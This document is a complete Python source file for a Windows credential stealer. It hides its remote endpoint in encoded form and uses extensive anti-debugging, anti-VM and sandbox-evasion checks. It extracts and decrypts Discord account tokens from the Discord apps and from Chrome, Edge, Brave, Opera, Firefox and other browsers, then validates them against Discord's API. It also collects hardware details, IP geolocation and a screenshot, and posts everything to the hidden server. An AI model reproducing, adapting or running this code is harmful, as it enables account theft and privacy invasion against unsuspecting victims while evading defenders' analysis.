# language: Python 3.10+, file: stealer.py
# deps: pip install requests pywin32 pycryptodome psutil Pillow
# target: Windows 11

import os, re, json, base64, shutil, tempfile, io, platform, uuid
import subprocess, sys, time, threading, hashlib, hmac, zlib, ctypes
import requests, psutil
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ── SECRET KEY — split across 3 constants, assembled at runtime ──
_A = bytes([80,114,105,109,101])
_B = bytes([84,97,108,104,97])
_C = bytes([159,60,122,17,222,188,68,2,248,145,86,35,170,120,205,239])

def _get_sk() -> bytes:
    base = _A + _B + _C
    h = hashlib.sha256(_A + _C).digest()[:4]
    return bytes(a ^ b for a, b in zip(base[:4], h)) + base[4:]

def _dec(blob: str) -> str:
    sk  = _get_sk()
    raw = base64.b85decode(blob.encode())
    key = sk * (len(raw) // len(sk) + 1)
    return zlib.decompress(bytes(a ^ b for a, b in zip(raw, key))).decode()

def _sign(body: bytes) -> str:
    return hmac.new(_get_sk(), body, hashlib.sha256).hexdigest()

_EP_ENC = 'D5#=EOnph(y0)+qGh7n&Y0%TTobTsVgd>?cy++CYv!|rCuy$A3@s>pb!3tSc'
ENDPOINT = _dec(_EP_ENC)

# ── ANTI-DEBUG ────────────────────────────────────────────────
_ALERT_TRIGGER  = None
_ALERT_PROCESS  = None

def _set_trigger(trigger: str, process: str):
    global _ALERT_TRIGGER, _ALERT_PROCESS
    _ALERT_TRIGGER = trigger
    _ALERT_PROCESS = process

def _exit_after_alert():
    screenshot = take_screenshot()
    device_txt = get_device_info()
    send_alert(_ALERT_TRIGGER, _ALERT_PROCESS, screenshot, device_txt)
    sys.exit(0)

def _check_debugger() -> bool:
    try:
        k32 = ctypes.windll.kernel32
        if k32.IsDebuggerPresent():
            _set_trigger("WinAPI / IsDebuggerPresent", "WinAPI")
            return True
        dbg = ctypes.c_int(0)
        k32.CheckRemoteDebuggerPresent(k32.GetCurrentProcess(), ctypes.byref(dbg))
        if dbg.value:
            _set_trigger("WinAPI / RemoteAttach", "WinAPI")
            return True
    except: pass
    return False

def _check_debug_port() -> bool:
    try:
        ntdll = ctypes.windll.ntdll
        k32   = ctypes.windll.kernel32
        port  = ctypes.c_ulong(0)
        ntdll.NtQueryInformationProcess(
            k32.GetCurrentProcess(), 7,
            ctypes.byref(port), ctypes.sizeof(port), None)
        if port.value:
            _set_trigger("NtQuery / DebugPort", "WinAPI")
            return True
    except: pass
    return False

def _check_debug_object() -> bool:
    try:
        ntdll  = ctypes.windll.ntdll
        k32    = ctypes.windll.kernel32
        handle = ctypes.c_ulong(0)
        status = ntdll.NtQueryInformationProcess(
            k32.GetCurrentProcess(), 0x1e,
            ctypes.byref(handle), ctypes.sizeof(handle), None)
        if status == 0 and handle.value:
            _set_trigger("NtQuery / DebugObject", "WinAPI")
            return True
    except: pass
    return False

def _check_ntglobalflag() -> bool:
    try:
        import struct
        k32 = ctypes.windll.kernel32
        peb = ctypes.c_ulong(0)
        ctypes.windll.ntdll.NtQueryInformationProcess(
            k32.GetCurrentProcess(), 0,
            ctypes.byref(peb), ctypes.sizeof(peb), None)
        is64   = struct.calcsize("P") == 8
        offset = 0xBC if is64 else 0x68
        flag   = ctypes.c_ulong(0)
        k32.ReadProcessMemory(
            k32.GetCurrentProcess(),
            ctypes.c_void_p(peb.value + offset),
            ctypes.byref(flag), 4, None)
        if flag.value & 0x70:
            _set_trigger("PEB / NtGlobalFlag", "WinAPI")
            return True
    except: pass
    return False

def _check_hardware_bp() -> bool:
    try:
        class CTX(ctypes.Structure):
            _fields_ = [("ContextFlags", ctypes.c_ulong),
                       ("_pad", ctypes.c_byte * 172),
                       ("Dr0", ctypes.c_ulong), ("Dr1", ctypes.c_ulong),
                       ("Dr2", ctypes.c_ulong), ("Dr3", ctypes.c_ulong),
                       ("Dr6", ctypes.c_ulong), ("Dr7", ctypes.c_ulong)]
        ctx = CTX(); ctx.ContextFlags = 0x10
        th  = ctypes.windll.kernel32.GetCurrentThread()
        if ctypes.windll.kernel32.GetThreadContext(th, ctypes.byref(ctx)):
            if any([ctx.Dr0, ctx.Dr1, ctx.Dr2, ctx.Dr3]):
                _set_trigger("CPU / HardwareBP", "WinAPI")
                return True
    except: pass
    return False

def _check_window_titles() -> bool:
    try:
        found = []
        def cb(hwnd, _):
            buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, 256)
            found.append(buf.value.lower())
            return True
        ctypes.windll.user32.EnumWindows(
            ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)(cb), 0)
        debug_titles = {
            "x64dbg": "x64dbg.exe", "x32dbg": "x32dbg.exe",
            "ollydbg": "ollydbg.exe", "immunity debugger": "immdbg.exe",
            "ida ": "idaq64.exe", "ghidra": "ghidra.exe",
            "windbg": "windbg.exe", "process hacker": "processhacker.exe",
            "process monitor": "procmon.exe", "wireshark": "wireshark.exe",
            "fiddler": "fiddler.exe", "dnspy": "dnspy.exe",
            "de4dot": "de4dot.exe", "dotpeek": "dotpeek.exe",
        }
        for title in found:
            for kw, proc in debug_titles.items():
                if kw in title:
                    _set_trigger("Window / Title", proc)
                    return True
    except: pass
    return False

def _check_parent() -> bool:
    try:
        me     = psutil.Process()
        parent = me.parent()
        if parent:
            pname = parent.name().lower()
            safe  = {"explorer.exe","cmd.exe","powershell.exe",
                     "pythonw.exe","python.exe","svchost.exe",
                     "wscript.exe","cscript.exe","conhost.exe"}
            if pname not in safe:
                _set_trigger("Process / ParentChain", parent.name())
                return True
    except: pass
    return False

def _check_vm_registry() -> bool:
    try:
        import winreg
        keys = [
            (r"SOFTWARE\VMware, Inc.\VMware Tools", "VMware Tools"),
            (r"SOFTWARE\Oracle\VirtualBox Guest Additions", "VirtualBox"),
            (r"SYSTEM\ControlSet001\Services\VBoxSF", "VirtualBox"),
            (r"SYSTEM\ControlSet001\Services\vmhgfs", "VMware"),
        ]
        for path, name in keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                _set_trigger("VM / Registry", name)
                return True
            except: pass
    except: pass
    return False

def _check_vm_procs() -> bool:
    try:
        running = {p.name().lower() for p in psutil.process_iter(["name"])}
        vm_map  = {
            "vmtoolsd.exe":      "VMware Tools",
            "vmwaretray.exe":    "VMware",
            "vboxservice.exe":   "VirtualBox",
            "vboxtray.exe":      "VirtualBox",
            "wireshark.exe":     "wireshark.exe",
            "procmon.exe":       "procmon.exe",
            "procmon64.exe":     "procmon.exe",
            "procexp.exe":       "procexp.exe",
            "processhacker.exe": "processhacker.exe",
            "ollydbg.exe":       "ollydbg.exe",
            "x64dbg.exe":        "x64dbg.exe",
            "x32dbg.exe":        "x32dbg.exe",
            "idaq.exe":          "idaq.exe",
            "idaq64.exe":        "idaq64.exe",
            "dnspy.exe":         "dnspy.exe",
            "de4dot.exe":        "de4dot.exe",
        }
        for proc, label in vm_map.items():
            if proc in running:
                _set_trigger("VM / ProcessList", label)
                return True
    except: pass
    return False

def _check_sandbox() -> bool:
    try:
        if (os.cpu_count() or 2) < 2:
            _set_trigger("Sandbox / LowCPU", "System")
            return True
    except: pass
    try:
        if psutil.virtual_memory().total < 2 * 1024**3:
            _set_trigger("Sandbox / LowRAM", "System")
            return True
    except: pass
    try:
        if time.time() - psutil.boot_time() < 300:
            _set_trigger("Sandbox / Uptime", "System")
            return True
    except: pass
    return False

def _check_timing() -> bool:
    t0 = time.perf_counter()
    _  = [i*i for i in range(500)]
    if time.perf_counter() - t0 > 0.5:
        _set_trigger("Sandbox / TimingStep", "System")
        return True
    return False

def _full_guard() -> bool:
    checks = [
        _check_debugger, _check_debug_port, _check_debug_object,
        _check_ntglobalflag, _check_hardware_bp, _check_window_titles,
        _check_parent, _check_vm_registry, _check_vm_procs,
        _check_sandbox, _check_timing,
    ]
    for fn in checks:
        if fn(): return True
    return False

def _guard_boot():
    if _full_guard():
        _exit_after_alert()

def _guard_thread():
    """Runtime continuous check — every 3s"""
    while True:
        time.sleep(3)
        if _full_guard():
            _exit_after_alert()

# ── UNICODE MONO ──────────────────────────────────────────────
def mono(s: str) -> str:
    out = []
    for c in s:
        if   'A' <= c <= 'Z': out.append(chr(0x1D670 + ord(c) - 65))
        elif 'a' <= c <= 'z': out.append(chr(0x1D68A + ord(c) - 97))
        elif '0' <= c <= '9': out.append(chr(0x1D7F6 + ord(c) - 48))
        else: out.append(c)
    return ''.join(out)

SEP  = "○ . ⌣⌣⌣ . ཻུ꧂ . ⌣⌣⌣ . ○"

# ── TOKEN REGEX ───────────────────────────────────────────────
ROAMING = os.getenv("APPDATA","")
LOCAL   = os.getenv("LOCALAPPDATA","")

try:
    import win32crypt
    from Crypto.Cipher import AES
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False

QUOTED_TOKEN = re.compile(rb'["\x27]([\w-]{24,}\.[\w-]{6}\.[\w-]{25,})["\x27]')
QUOTED_MFA   = re.compile(rb'["\x27]?(mfa\.[\w-]{84})["\x27]?')

def get_running() -> set:
    try: return {p.name().lower() for p in psutil.process_iter(["name"])}
    except: return set()

def store_label(name: str, running: set) -> str:
    n = name.lower()
    if "discord" in n:    origin = "app"
    elif "chrome" in n:   origin = "web-chrome"
    elif "edge" in n:     origin = "web-edge"
    elif "brave" in n:    origin = "web-brave"
    elif "opera gx" in n: origin = "web-opera-gx"
    elif "opera" in n:    origin = "web-opera"
    elif "vivaldi" in n:  origin = "web-vivaldi"
    elif "firefox" in n:  origin = "web-firefox"
    elif "yandex" in n:   origin = "web-yandex"
    else:                 origin = "web-other"
    disc_procs = {"discord.exe","discordptb.exe","discordcanary.exe"}
    browser_procs = {"chrome.exe","msedge.exe","brave.exe","opera.exe","vivaldi.exe"}
    all_procs = disc_procs | browser_procs
    live = bool(all_procs & running)
    return f"{'runtime' if live else 'offline'}/{origin}"

def build_paths() -> list:
    out = []
    for app in ("discord","discordptb","discordcanary","discorddevelopment"):
        p = Path(ROAMING)/app/"Local Storage"/"leveldb"
        if p.exists(): out.append((app, p))
    browsers = [
        ("Chrome",   Path(LOCAL)/"Google"/"Chrome"/"User Data"),
        ("Edge",     Path(LOCAL)/"Microsoft"/"Edge"/"User Data"),
        ("Brave",    Path(LOCAL)/"BraveSoftware"/"Brave-Browser"/"User Data"),
        ("Vivaldi",  Path(LOCAL)/"Vivaldi"/"User Data"),
        ("Chromium", Path(LOCAL)/"Chromium"/"User Data"),
        ("Opera",    Path(ROAMING)/"Opera Software"/"Opera Stable"),
        ("Opera GX", Path(ROAMING)/"Opera Software"/"Opera GX Stable"),
        ("Yandex",   Path(LOCAL)/"Yandex"/"YandexBrowser"/"User Data"),
    ]
    for name, base in browsers:
        if not base.exists(): continue
        for prof in ["Default"]+[f"Profile {i}" for i in range(1,10)]:
            ldb = base/prof/"Local Storage"/"leveldb"
            if ldb.exists(): out.append((f"{name}/{prof}", ldb))
    return out

def get_master_key(ldb: Path):
    if not CRYPTO_OK: return None
    base = ldb
    for _ in range(5):
        base = base.parent
        if (base/"Local State").exists(): break
    else: return None
    try:
        d   = json.loads((base/"Local State").read_text(encoding="utf-8"))
        enc = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except: return None

def decrypt_blob(blob: bytes, key: bytes) -> str:
    try:
        if blob[:3] in (b"v10",b"v11"):
            aes = AES.new(key, AES.MODE_GCM, blob[3:15])
            return aes.decrypt_and_verify(blob[15:-16], blob[-16:]).decode()
        if CRYPTO_OK:
            return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode()
    except: pass
    return ""

def scan_source(name: str, ldb: Path, running: set) -> dict:
    result = {}
    label  = store_label(name, running)
    key    = get_master_key(ldb)
    tmp = None
    try:
        tmp = Path(tempfile.mkdtemp())
        for f in ldb.iterdir():
            if f.suffix in (".ldb",".log"):
                try: shutil.copy2(f, tmp/f.name)
                except: pass
    except: tmp = None
    scan_dir = tmp if (tmp and tmp.exists() and any(tmp.iterdir())) else ldb
    found = set()
    for f in scan_dir.iterdir():
        if f.suffix not in (".ldb",".log"): continue
        try:
            raw = f.read_bytes()
            for m in QUOTED_TOKEN.finditer(raw): found.add(m.group(1).decode("utf-8","replace"))
            for m in QUOTED_MFA.finditer(raw):   found.add(m.group(1).decode("utf-8","replace"))
            if key:
                for m in re.finditer(rb"v1[01].{12}.{15,}", raw):
                    dec = decrypt_blob(m.group(0), key)
                    if dec and (re.match(r"[\w-]{24,}\.[\w-]{6}\.[\w-]{25,}", dec) or dec.startswith("mfa.")):
                        found.add(dec)
        except: pass
    for tk in found:
        result.setdefault(tk, label)
    if tmp:
        try: shutil.rmtree(tmp)
        except: pass
    return result

def scan_firefox(running: set) -> dict:
    result = {}
    label  = store_label("firefox", running)
    root   = Path(ROAMING)/"Mozilla"/"Firefox"/"Profiles"
    if not root.exists(): return result
    try:
        import sqlite3
        for profile in root.iterdir():
            db = profile/"webappsstore.sqlite"
            if not db.exists(): continue
            tmp = Path(tempfile.mktemp(suffix=".sqlite"))
            try:
                shutil.copy2(db, tmp)
                con  = sqlite3.connect(str(tmp))
                rows = con.execute(
                    "SELECT value FROM webappsstore2 WHERE originKey LIKE '%discord%' AND key='token'"
                ).fetchall()
                con.close()
                for (v,) in rows:
                    v = v.strip('"').strip("'")
                    if re.match(r"[\w-]{24,}\.[\w-]{6}\.[\w-]{25,}", v) or v.startswith("mfa."):
                        result.setdefault(v, label)
            except: pass
            finally:
                try: tmp.unlink()
                except: pass
    except: pass
    return result

def validate(token: str):
    try:
        r = requests.get("https://discord.com/api/v10/users/@me",
                         headers={"Authorization": token}, timeout=5)
        return (True, r.json()) if r.status_code == 200 else (False, None)
    except: return (False, None)

def get_hwid() -> str:
    try:
        import winreg
        key  = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        guid = winreg.QueryValueEx(key, "MachineGuid")[0]
        winreg.CloseKey(key)
        if guid and "00000000" not in guid: return guid
    except: pass
    try:
        h = subprocess.check_output("wmic csproduct get UUID", shell=True,
            stderr=subprocess.DEVNULL).decode().split("\n")[1].strip()
        if h: return h
    except: pass
    return "—"

def take_screenshot() -> bytes | None:
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO(); img.save(buf, format="PNG", optimize=True)
        return buf.getvalue()
    except: pass
    try:
        import win32gui, win32ui, win32con, win32api
        w = win32api.GetSystemMetrics(0); h = win32api.GetSystemMetrics(1)
        hd  = win32gui.GetDesktopWindow()
        ddc = win32gui.GetWindowDC(hd)
        idc = win32ui.CreateDCFromHandle(ddc)
        mdc = idc.CreateCompatibleDC()
        bmp = win32ui.CreateBitmap()
        bmp.CreateCompatibleBitmap(idc, w, h)
        mdc.SelectObject(bmp)
        mdc.BitBlt((0,0),(w,h), idc,(0,0), win32con.SRCCOPY)
        raw = bmp.GetBitmapBits(True)
        mdc.DeleteDC(); win32gui.DeleteObject(bmp.GetHandle())
        win32gui.ReleaseDC(hd, ddc)
        from PIL import Image
        img = Image.frombytes("RGB",(w,h), bytes(raw),"raw","BGRX")
        buf = io.BytesIO(); img.save(buf, format="PNG"); return buf.getvalue()
    except: pass
    return None

def get_device_info() -> str:
    lines = []
    def row(k,v): lines.append(f"  {k:<22} {v}")
    def sep(): lines.append(f"\n  {SEP}\n")

    lines.append(f". 花 . ᕫᴣ、{mono('Device Info')} . ≧。 . ıl")
    lines.append(f"\n  {SEP}\n")

    row(mono("Computer"),  os.getenv("COMPUTERNAME", platform.node()))
    row(mono("Username"),  os.getenv("USERNAME","—"))
    row(mono("OS"),        f"{platform.system()} {platform.release()}")
    row(mono("Build"),     platform.version())
    row(mono("Arch"),      platform.machine())
    row(mono("HWID"),      get_hwid())

    sep()

    try:
        cpu = platform.processor() or subprocess.check_output(
            "wmic cpu get Name", shell=True, stderr=subprocess.DEVNULL
        ).decode().split("\n")[1].strip()
        row(mono("CPU"), cpu)
    except: row(mono("CPU"),"—")
    try:
        vm = psutil.virtual_memory()
        row(mono("RAM"), f"{round(vm.total/1024**3,1)} GB  (free {round(vm.available/1024**3,1)} GB)")
    except: row(mono("RAM"),"—")
    try:
        gpu = subprocess.check_output("wmic path win32_VideoController get Name",
              shell=True, stderr=subprocess.DEVNULL).decode().split("\n")[1].strip()
        row(mono("GPU"), gpu)
    except: row(mono("GPU"),"—")
    try:
        disks = []
        for d in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(d.mountpoint)
                disks.append(f"{d.device} {round(u.total/1024**3,1)}GB")
            except: pass
        row(mono("Disks"), "  |  ".join(disks))
    except: pass
    try:
        mac = ":".join(f"{(uuid.getnode()>>(i*8))&0xff:02x}" for i in range(5,-1,-1))
        row(mono("MAC"), mac)
    except: pass
    try:
        import win32api
        row(mono("Resolution"), f"{win32api.GetSystemMetrics(0)}x{win32api.GetSystemMetrics(1)}")
    except: pass

    row(mono("Timestamp"), datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    sep()

    try:
        ip = requests.get(
            "http://ip-api.com/json/?fields=status,country,countryCode,"
            "regionName,city,zip,lat,lon,timezone,isp,org,as,query",
            timeout=5).json()
        if ip.get("status") == "success":
            row(mono("Public IP"),   ip.get("query","—"))
            row(mono("Country"),     f"{ip.get('country','—')} ({ip.get('countryCode','—')})")
            row(mono("Region"),      ip.get("regionName","—"))
            row(mono("City"),        ip.get("city","—"))
            row(mono("ZIP"),         ip.get("zip","—"))
            row(mono("Coordinates"), f"{ip.get('lat','—')}, {ip.get('lon','—')}")
            row(mono("Timezone"),    ip.get("timezone","—"))
            row(mono("ISP"),         ip.get("isp","—"))
            row(mono("Org"),         ip.get("org","—"))
            row(mono("AS"),          ip.get("as","—"))
    except: row(mono("IP"),"unavailable")

    return "\n".join(lines)

# ── SEND ──────────────────────────────────────────────────────
def _post(payload: dict, screenshot: bytes | None, device_txt: str | None,
          extra_files: dict | None = None):
    body = json.dumps(payload).encode()
    sig  = _sign(body)
    form: dict = {
        "payload_json": (None, body, "application/json"),
        "X-Sig":        (None, sig.encode(), "text/plain"),
    }
    if screenshot:
        form["screenshot"] = ("screenshot.png", io.BytesIO(screenshot), "image/png")
    if device_txt:
        form["device_txt"] = ("device_info.txt",
                              io.BytesIO(device_txt.encode()), "text/plain")
    if extra_files:
        form.update(extra_files)
    try:
        requests.post(ENDPOINT, files=form, timeout=30)
    except: pass

def send_alert(trigger: str, process: str,
               screenshot: bytes | None, device_txt: str):
    payload = {
        "type":    "alert",
        "trigger": trigger,
        "process": process,
        "hwid":    get_hwid(),
        "ts":      datetime.now().isoformat(),
    }
    _post(payload, screenshot, device_txt)

def send_report(results: list, screenshot: bytes | None, device_txt: str):
    tokens_out = []
    for r in results:
        u = r.get("user") or {}
        entry = {"token": r["token"], "label": r["label"], "valid": r["valid"]}
        if r["valid"] and u:
            entry.update({
                "username":    u.get("username","—"),
                "global_name": u.get("global_name") or u.get("username","—"),
                "id":          u.get("id","—"),
                "email":       u.get("email","—"),
                "phone":       u.get("phone","—"),
                "mfa":         str(u.get("mfa_enabled","—")),
                "nitro":       str(bool(u.get("premium_type"))),
                "avatar_hash": u.get("avatar",""),
            })
        tokens_out.append(entry)
    payload = {
        "type":   "report",
        "tokens": tokens_out,
        "hwid":   get_hwid(),
        "ts":     datetime.now().isoformat(),
    }
    _post(payload, screenshot, device_txt)

# ── MAIN ──────────────────────────────────────────────────────
def run():
    _guard_boot()

    t = threading.Thread(target=_guard_thread, daemon=True)
    t.start()

    running = get_running()
    paths   = build_paths()

    token_map: dict[str,str] = {}
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(scan_source, n, p, running): n for n,p in paths}
        futs[ex.submit(scan_firefox, running)] = "Firefox"
        for fut in as_completed(futs, timeout=12):
            try:
                for tk, src in fut.result().items():
                    token_map.setdefault(tk, src)
            except: pass

    results = []
    seen    = set()
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(validate, tk): tk for tk in token_map}
        for fut in as_completed(futs, timeout=30):
            tk = futs[fut]
            try:
                valid, user = fut.result()
                if tk not in seen:
                    seen.add(tk)
                    results.append({"token":tk,"label":token_map[tk],"valid":valid,"user":user})
            except: pass

    results.sort(key=lambda r: not r["valid"])

    screenshot = take_screenshot()
    device_txt = get_device_info()
    send_report(results, screenshot, device_txt)

if __name__ == "__main__":
    run()
